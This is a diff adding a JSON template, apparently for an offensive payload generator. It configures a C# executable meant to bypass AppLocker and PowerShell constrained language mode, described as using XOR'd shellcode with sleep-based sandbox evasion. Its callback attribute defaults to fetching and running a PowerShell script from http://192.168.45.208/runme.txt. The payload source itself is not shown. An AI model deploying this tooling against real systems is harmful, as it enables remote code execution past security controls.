@@ -1,0 +1,42 @@
+{
+    "categories": [
+        "exe",
+        "applocker"
+    ],
+    "description": "Executable that runs shell code. XOR'd shell code with sleep sandbox evasion.",
+    "contentFile": "execonstrainedlanguagebypass.txt",
+    "customAttributes": [
+        {
+            "name": "callbackURL",
+            "description": "Executable will call back and run the PowerShell script at this http address.",
+            "defaultValue": "http://192.168.45.208/runme.txt"
+        },
+        {
+            "name": "compile",
+            "description": "Whether or not to compile. Y/N",
+            "defaultValue": "Y"
+        }
+    ],
+    "shellCode": {
+        "hasShellCode": false
+    },
+    "compilation": {
+        "compilationType": "csharp",
+        "target": "exe",
+        "requiredAssemblies" : [
+            "System.Management.Automation.dll","System.Configuration.Install.dll"
+        ],
+        "compilationAttributes": [
+            {
+                "name": "architecture",
+                "description": "The architecture, x64 or x86.",
+                "defaultValue": "x64"
+            },
+            {
+                "name": "saveAs",
+                "description": "Name of file to be created, can be full path or just a name",
+                "defaultValue": "bypass.exe"
+            }
+        ]
+    }
+}
